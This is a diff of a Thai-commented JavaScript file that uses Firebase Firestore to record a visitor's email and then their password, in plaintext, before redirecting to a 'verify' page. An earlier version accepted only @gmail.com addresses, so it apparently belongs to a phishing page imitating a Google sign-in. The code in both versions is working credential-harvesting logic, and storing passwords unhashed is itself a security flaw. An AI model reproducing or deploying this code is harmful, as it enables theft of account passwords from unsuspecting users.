@@ -19,41 +19,23 @@ const db = firebase.firestore();  // Firestore Database
 console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
 console.log("📂 Firestore Instance:", db);
 
-// 📌 ตรวจสอบอีเมล และ ปิด/เปิดปุ่ม "ถัดไป"
-function validateEmail() {
-    let email = document.getElementById("email").value.trim();
-    let nextButton = document.getElementById("next-btn");
-
-    // ✅ ถ้าอีเมลลงท้ายด้วย @gmail.com ให้เปิดปุ่ม
-    if (email.endsWith("@gmail.com")) {
-        nextButton.disabled = false; // 🔓 เปิดใช้งานปุ่ม
-    } else {
-        nextButton.disabled = true; // 🔒 ปิดปุ่มถ้ายังไม่ถูกต้อง
-    }
-}
-
-// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore และไปหน้ารหัสผ่าน
+// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore
 function saveEmail() {
     let email = document.getElementById("email").value.trim();
+    console.log("📩 อีเมลที่กรอก:", email);
 
-    if (!email.endsWith("@gmail.com")) {
-        return; // ❌ ไม่ให้ไปต่อถ้าอีเมลผิด
+    if (!email) {
+        return; // ❌ ไม่แจ้งเตือน แค่ไม่ให้ทำงานต่อ
     }
 
-    try {
-        localStorage.setItem("userEmail", email);
-    } catch (e) {
-        console.warn("⚠️ localStorage ใช้งานไม่ได้บนเบราว์เซอร์นี้");
-    }
-
-    // ✅ บันทึกอีเมลลง Firestore
     db.collection("users").doc(email).set({
         email: email,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
     }, { merge: true })
     .then(() => {
         console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
-        window.location.href = "password.html"; // ✅ ไปหน้าถัดไป
+        localStorage.setItem("userEmail", email);
+        window.location.href = "password.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
     })
     .catch(error => {
         console.error("❌ เกิดข้อผิดพลาด:", error);
@@ -63,41 +45,27 @@ function saveEmail() {
 // 📌 ฟังก์ชันบันทึกรหัสผ่านลง Firestore
 function savePassword() {
     let password = document.getElementById("password").value.trim();
-    let email = null;
-
-    try {
-        email = localStorage.getItem("userEmail"); // ดึงค่าอีเมล
-    } catch (e) {
-        console.warn("⚠️ localStorage ใช้งานไม่ได้บนเบราว์เซอร์นี้");
-    }
+    let email = localStorage.getItem("userEmail");
 
     console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);
 
     if (!email) {
-        console.error("❌ ไม่พบอีเมล! กลับไปหน้า login");
-        window.location.href = "login.html";
+        window.location.href = "index.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
         return;
     }
 
     if (!password) {
-        console.warn("⚠️ กรุณากรอกรหัสผ่าน");
-        return;
+        return; // ❌ ไม่แจ้งเตือน แค่ไม่ให้ทำงานต่อ
     }
 
-    // ✅ บันทึกรหัสผ่านลง Firestore
     db.collection("users").doc(email).update({
         password: password
     })
     .then(() => {
-        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase! ไป verify.html...");
-        window.location.href = "verify.html"; // ✅ ไปหน้ายืนยันตัว
+        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
+        window.location.href = "verify.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
     })
     .catch(error => {
-        console.error("❌ เกิดข้อผิดพลาดในการบันทึกรหัสผ่าน:", error);
+        console.error("❌ เกิดข้อผิดพลาด:", error);
     });
 }
-
-// ✅ ตรวจสอบว่า Firebase โหลดสมบูรณ์ก่อนใช้ฟังก์ชัน
-document.addEventListener("DOMContentLoaded", function() {
-    console.log("📌 DOM โหลดเสร็จแล้ว");
-});
